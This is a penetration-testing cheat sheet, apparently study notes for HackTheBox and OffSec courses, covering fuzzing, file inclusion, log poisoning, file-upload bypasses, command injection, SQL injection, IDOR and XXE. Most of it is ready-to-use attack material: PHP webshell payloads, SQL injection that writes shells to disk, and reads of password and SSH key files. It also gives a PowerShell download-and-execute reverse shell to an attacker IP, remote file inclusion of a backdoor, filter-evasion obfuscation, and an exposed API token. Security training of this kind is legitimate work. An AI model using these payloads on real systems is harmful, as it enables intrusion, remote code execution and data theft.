### Common Applications

* CMS:
	* **[Wordpress](https://academy.hackthebox.com/module/113/section/1100)** (`api-token: B6Xs2CqIkohUytn8nDdDegW1akcv8MWiNw2gnxosfX4`)
	* **[Joomla](https://academy.hackthebox.com/module/113/section/1095)**
	* **[Drupal](https://academy.hackthebox.com/module/113/section/1089)**
* Servlet Containers/Software Development:
	* **[Tomcat](https://academy.hackthebox.com/module/113/section/1090)** / **[Tomcat CGI](https://academy.hackthebox.com/module/113/section/2140)** / **[Shellshock](https://academy.hackthebox.com/module/113/section/2166)**
	* **[Jenkins](https://academy.hackthebox.com/module/113/section/1091)**
* Infrastructure/Network Monitoring Tools
	* **[Splunk](https://academy.hackthebox.com/module/113/section/1092)**
	* **[PRTG Network Monitor](https://academy.hackthebox.com/module/113/section/1094)**
* Customer Service & Configuration Management
	* **[osTicket](https://academy.hackthebox.com/module/113/section/1214)**
	* **[GitLab](https://academy.hackthebox.com/module/113/section/1216)**
* **[Desktop Applications](https://academy.hackthebox.com/module/113/section/2139)**
* Miscellaneous Applications
	* **[Coldfusion](https://academy.hackthebox.com/module/113/section/2134)**
	* **[IIS Tilde Enumeration](https://academy.hackthebox.com/module/113/section/2152)**
	* **[Other Notable Applications](https://academy.hackthebox.com/module/113/section/1102)**
		* Axis2
		* Websphere
		* Elasticsearch
		* Zabbix
		* Nagios
		* WebLogic
		* Wikis/Intranets
		* DotNetNuke
		* vCenter
### Fuzzing

* Directory fuzzing: `ffuf -w <wordlist>:FUZZ -u "http://academy.htb:30873/FUZZ" -t 200 -e .aspx,.php,.jsp,.html,.js -recursion -recursion-depth 1 -fs xxx`
* Subdomain fuzzing: `ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/` (do not forget to add host to `/etc/hosts` file)
* VHOST fuzzing: `ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'` (do not forget to add host to `/etc/hosts` file) 
* Extensions fuzzing: `ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://academy.htb/indexFUZZ" -fs xxx`
* GET/POST fuzzing:
	* GET: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://host:PORT/admin.php?FUZZ=key -fs xxx`
	* POST: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://host:PORT/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
	* Values: `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u 'http://academy.htb/admin.php' -X POST -d "username=FUZZ" -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
### Enumerating and Abusing APIs
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
```text
pattern.txt

{GOBUSTER}/v1
{GOBUSTER}/v2
```

### Cross-Site Scripting
> **Special characters:** 
> * `< > ' " { } ;`

**[XSSStrike:](https://github.com/s0md3v/XSStrike)** XSS scanner
**[PayloadsAllTheThings:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)** XSS Injection payloads

### Directory Traversal / File Inclusion (LFI/RFI) / Log Poisoning
> **Notes:**
> * Use curl to get better formatting
> * If we retrieve the passwd file, try to retrieve `id_rsa` files
> * Encode characters if needed
> * Check for log poisoning in **Apache** servers
> * Use **[LFITester](https://github.com/kostas-pa/LFITester)**

Configuration files and dangerous settings:
* Configuration file for Apache: `/etc/php/X.Y/apache2/php.ini`
* Configuration file for Nginx: `/etc/php/X.Y/fpm/php.ini`

	Settings:
	* `allow_url_include`: Allow RCE through wrappers and RFI
	* `extension=expect`: Allow RCE through `expect` wrapper

| **Files to try**                                                           | **Description**                             |
| -------------------------------------------------------------------------- | ------------------------------------------- |
| `/index.php?page=../../../../etc/passwd`                                   | Linux                                       |
| `/index.php?page=../../../../Windows/System32/drivers/etc/hosts`           | Windows 1                                   |
| `/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts`           | Windows 2                                   |
| `/index.php?page=../../../../var/log/apache2/access.log`                   | Apache (log poisoning)                      |
| `/index.php?page=../../../../xampp/apache/logs/access.log`                 | Apache (log poisoning) in XAMP 1            |
| `/index.php?page=..\..\..\..\xampp\apache\logs\access.log`                 | Apache (log poisoning) in XAMP 2            |
| `/index.php?page=../../../../var/lib/php/sessions/sess_<PHPSESSID Cookie>` | PHP Session Poisoning with PHPSESSID cookie |

If we retrieve Apache access log, insert php code in the User-Agent header of the original request to trigger Log Poisoning vulnerability, then you can see the command output in the log file

> [!warning] Do no forget to try both Linux and Windows commands in log poisoning execution

Through curl: `curl -s ".../meteor/index.php" -A '<?php system($_GET["cmd"]); ?>'`

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)

If we retrieve PHP session file we can insert a payload through the vulnerable parameter and then trigger it visiting the PHP session file:
* Inserting the payload: `...index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
* Triggering the payload: `...index.php?language=/var/lib/php/sessions/sess_<PHPSESSID Cookie>&cmd=id`

**Note:** To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after our last inclusion

There are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

**Finding vulnerable parameters to abuse:**
	`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
	`ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
**Finding the full server webroot path**: 
	`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
**Finding Server logs/Configuration files:**
	`ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`

| **PHP Wrappers**                                                                                                                | **Description**                                         |
| ------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| `/index.php?page=php://filter/resource=admin.php`                                                                               | Get resource                                            |
| `/index.php?page=php://filter/convert.base64-encode/resource=admin.php`                                                         | Get b64 encoded resource                                |
| `curl "http://host.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`                                 | RCE through wrappers - For GET parameters               |
| `curl "http://host.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"` | RCE through wrappers (b64 encoded) - For GET parameters |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`     | RCE through input wrapper - For POST parameters         |
| `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`                      | RCE through RFI                                         |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                            | RCE through expect wrapper                              |
If http RFI is blocked by a firewall or a WAF, we can achieve RFI with ftp or smb (if the app is hosted on a Windows server):
* FTP:
	* Start the server where the php file is located: `sudo python -m pyftpdlib -p 21`
	* Trigger the RFI: `curl "http://mountaindesserts.com/meteor/index.php?page=ftp://192.168.119.3/simple-backdoor.php&cmd=ls"`
* SMB:
	* Start the server where the php file is located: `sudo impacket-smbserver share -smb2support .`
	* Trigger the RFI: `curl "http://mountaindesserts.com/meteor/index.php?page=\\192.168.119.3\share\simple-backdoor.php&cmd=ls"`

### File Upload

**We should always check disabling Front-end validation**

> **Notes:**
> * If `.asp` or `.aspx` are allowed upload a webshell as **[p0wny shell](https://github.com/flozz/p0wny-shell)**
> * If `.php` file is not allowed try:
> 	* `.pHP`
> 	* `.phps`
> 	* `.php7`
> 	* `.phtml`
> 	* `.phar`
> * If `.gif` file is allowed upload: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
> * If `.zip` file is allowed upload: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
> * If `.phar`wrapper is allowed upload a jpg file like this:
> 	```php
> 	shell.php
> 	<?php
> 	$phar = new Phar('shell.phar');
> 	$phar->startBuffering();
> 	$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
> 	$phar->setStub('<?php __HALT_COMPILER(); ?>');
> 	
> 	$phar->stopBuffering();
> 	```
> 	Convert the shell to a jpg image: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
> 	And then trigger the shell with phar wrapper: `...index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

**[Wordlist: PHP extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)**

We can upload a file using **double extensions** and **reverse double extension**

Character injection:
* `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

We can build a custom wordlist with character injection:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**MIME-Type:**
* [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
* [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

XSS with file metadata: `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
XSS with svg file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

OR

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/contact/upload.php"> ]>
<svg>&xxe;</svg>
```

If we can upload a file and include `../` in the file name, maybe we can overwrite the **authorized_keys**:

```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/999ddab4c6543dc3d727618bc14ed495-cwa_fu_burprelsshcom.png)

SSH can throw an error if it cannot verify the host key it saved previously. If this happen, remove `~/.ssh/known_hosts`

```bash
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host [mountaindesserts.com]:2222 ([192.168.50.16]:2222) cant be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

### Command Injection

First of all, try to find all blacklisted/whitelisted characters one by one.

**[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)**
**[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)**

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
**Bypassing Space Filters**
* Using tabs: `127.0.0.1%0a%09`
* Using IFS: `127.0.0.1%0a${IFS}`
* Using brace expansion: `127.0.0.1%0a{ls,-la}`

**Bypassing Other Characters:**
* Using variables and picking one character: 
	* Linux: 
		 ```bash
		peluqqi@htb[/htb]$ echo ${PATH}		
		/usr/local/bin:/usr/bin:/bin:/usr/games
		
		peluqqi@htb[/htb]$ echo ${PATH:0:1}		
		/
		
		peluqqi@htb[/htb]$ echo ${LS_COLORS:10:1}
		;
		``` 
	* Windows cmd:
		```cmd-session
		C:\htb> echo %HOMEPATH:~6,-11%

		\
		```
	* Windows Powershell:
		```powershell-session
		PS C:\htb> $env:HOMEPATH[0]
		\

		PS C:\htb> $env:PROGRAMFILES[10]
		```

**And more bypassing:**
* Linux:
	* `w'h'o'am'i`
	* `w"h"o"am"i`
	* `who$@ami`
	* `w\ho\am\i`
* Windows:
	* `who^ami`
* Both:
	* Case manipulation: `WhOaMi`
	* Reversed commands: 
		```bash
		peluqqi@htb[/htb]$ echo 'whoami' | rev
		imaohw

		peluqqi@htb[/htb]$ $(rev<<<'imaohw')
		```
		```powershell-session
		PS C:\htb> "whoami"[-1..-20] -join ''
		imaohw
		
		PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
		```
	* Encoded commands
		```bash
		peluqqi@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
		Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

		peluqqi@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
		```
		```powershell-session
		PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
		dwBoAG8AYQBtAGkA
		
		PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
		```

Snippet to detect CMD or Powershell in Windows systems

```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

If Powershell is available, we can use powercat.ps1 (Powercat is a PowerShell implementation of Netcat included in Kali) and python server

```shell
Command to trigger:
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

Command injection:
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

### SQL Injection Attacks

> **Notes:**
> * Union-based payloads has to include the same number of columns as the original query and the data types need to be compatible between each column
> * **Useful Info to retrieve:**
> 	* `@version / database() / user()`
> 	* `SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()`
> * We can specify php code in a Union-based SQLi and output to a file, then trigger it to gain RCE

| **SQLi Discovery** |                |
| ------------------ | -------------- |
| **Payload**        | **URL Encode** |
| `'`                | `%27`          |
| `"`                | `%22`          |
| `#`                | `%23`          |
| `;`                | `%3B`          |
| `)`                | `%29`          |

| **Payloads**                                                                                                                             | **Description**                                                                                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `'`                                                                                                                                      | Special characters. If any of them throws an error could mean SQL Injection is possible                                                                                                                                |
| `' OR 1=1 -- //`                                                                                                                         | Basic injection                                                                                                                                                                                                        |
| `' AND 1=1 -- //`                                                                                                                        | **Boolean-based** SQLi. Since _1=1_ will always be TRUE, the application will return the values only if the user (or whatever field we have filled) is present in the database                                         |
| `' AND IF (1=1, sleep(3),'false') -- //`                                                                                                 | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent                                                                                 |
| **Error-based payloads**                                                                                                                 | **Description**                                                                                                                                                                                                        |
| `' or 1=1 in (select @@version) -- //`                                                                                                   | If it returns the version, querying the database interactively is possible, so we can run queries like this. If we receive an error specifying the number of columns we can filter the query to return just one column |
| `' or 1=1 in (select table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()) -- //`         | Query db info                                                                                                                                                                                                          |
| `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`                                                                | Example query                                                                                                                                                                                                          |
| **Union-based payloads**                                                                                                                 | **Description**                                                                                                                                                                                                        |
| `' ORDER BY 1-- //`                                                                                                                      | To discover the number of columns. It will order the results by a specific column, meaning it will fail whenever the selected column does not exist                                                                    |
| `%' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database()  -- //` | Query db info                                                                                                                                                                                                          |
| `%' UNION SELECT null, password, null FROM users  -- //`                                                                                 | Example query                                                                                                                                                                                                          |
| `%' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //`                | Write a shell in root folder                                                                                                                                                                                           |
| `%' UNION SELECT null, user(), LOAD_FILE('/root/.ssh/id_rsa') , null, null FROM ilfreight.users  -- //`                                  | Read a file                                                                                                                                                                                                            |
| **Blind payloads**                                                                                                                       | **Description**                                                                                                                                                                                                        |
| `' AND IF (1=1, sleep(3),'false') -- //`                                                                                                 | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent                                                                                 |
| `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //`                 | Write a shell in root folder                                                                                                                                                                                           |
**Attacking SQL Databases**: https://academy.hackthebox.com/module/116/section/1169

Enable code execution in MSSQL (`xp_cmdshell`):

```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
root
```

Write a shell into a file in the server:

```bash
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

We can get an error with the above payload but the error is related to the incorrect return type, and should not impact writing the webshell on disk.

| **SQLMap**                                                                                                | **Description**                                                                                                                                                    |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`                                             | Specify parameter user and use 1 as dummy value                                                                                                                    |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`                                      | Dump the entire database                                                                                                                                           |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --os-shell`                                  | Gives us a fully interactive shell                                                                                                                                 |
| `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`                                  | Writes a shell in specified server folder by using a request file (POST request via Burp and saved it as a local text file), and returns a fully interactive shell |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                       | DB Schema enumeration                                                                                                                                              |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                               | Search identifiers names (Tables)                                                                                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --search -C passw`                                              | Search identifiers names (Column)                                                                                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                      | Dump specific table and columns                                                                                                                                    |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                            | With passwords flag sqlmap will try to crack the passwords                                                                                                         |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                              | Checking for DBA Privileges                                                                                                                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                      | Reading files                                                                                                                                                      |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing local files                                                                                                                                                |
| `--level 1-5 O --risk 1-5`                                                                                | Increase level or risk                                                                                                                                             |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users --tamper=between,randomcase`                    | Tampering to bypass security                                                                                                                                       |

### HTTP Verb Tampering
With this technique we can abuse some functionalities:
* HTTP basic authentication, just changing the HTTP method.
* Security filters that prevent web exploitation

<u>HTTP Method</u>
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

| **Command** | **Description** |
| ---- | ---- |
| `-X OPTIONS` | Set HTTP Method with Curl |
### Stealing NTLM Hash with Responder
[[2. Attacking AD#Stealing NTLM hashes with Responder]]

### Insecure Direct Object References (IDOR)
Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies. In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

<u>AJAX Calls</u>:
We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role. For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.
This is not unique to admin functions, of course, but can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows a basic example of an AJAX call:

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (e.g., open-source web applications).

<u>Understand Hashing/Encoding</u>:
Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end. Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded (from its character set), which we can decode to get the original object reference of (`file_123.pdf`). Then, we can try encoding a different object reference (e.g. `file_124.pdf`) and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`), which may reveal an IDOR vulnerability if we were able to retrieve any data.

On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

<u>Compare User Roles</u>

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data. For example, if we had access to two different users, one of which can view their salary after making the following API call:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as `User1`. However, with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.

<u>Mass IDOR Enumeration</u>:
We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files.

In the following example we find for `uid=1` the following values:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

So:
```bash
peluqqi@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

And we can automatize this:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

With this technique we can abuse APIs too and retrieve information that is hidden for us at first glance, we can even change user details or whatever.

### XXE External Entity (XXE) Injection (Just CPTS)
**[Basic Information](https://academy.hackthebox.com/module/134/section/1203)**

**[Local File Disclosure (Reading files)](https://academy.hackthebox.com/module/134/section/1204)**
* Reading Sensitive Files:
```xml
<!DOCTYPE email [
    <!ENTITY company SYSTEM "file://index.php">
]>
----
<email>
    &company;
</email>
```

* Reading Source Code:
```xml
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
----
<email>
    &company;
</email>
```

* Remote Code Execution: (With python server to publish our shell)
```xml
<!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
----
<email>
    &company;
</email>
```

**[Advanced File Disclosure (If simple Local File Disclosure doesn't work)](https://academy.hackthebox.com/module/134/section/1206)**
We need to establish the following:
```bash
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
]>

<!ENTITY joined "%begin;%file;%end;">
```

So create a dtd file with the joined variable and setup a python server:
```bash
peluqqi@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
peluqqi@htb[/htb]$ python3 -m http.server 8000
```

Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

**[Blind Data Exfiltration](https://academy.hackthebox.com/module/134/section/1207)**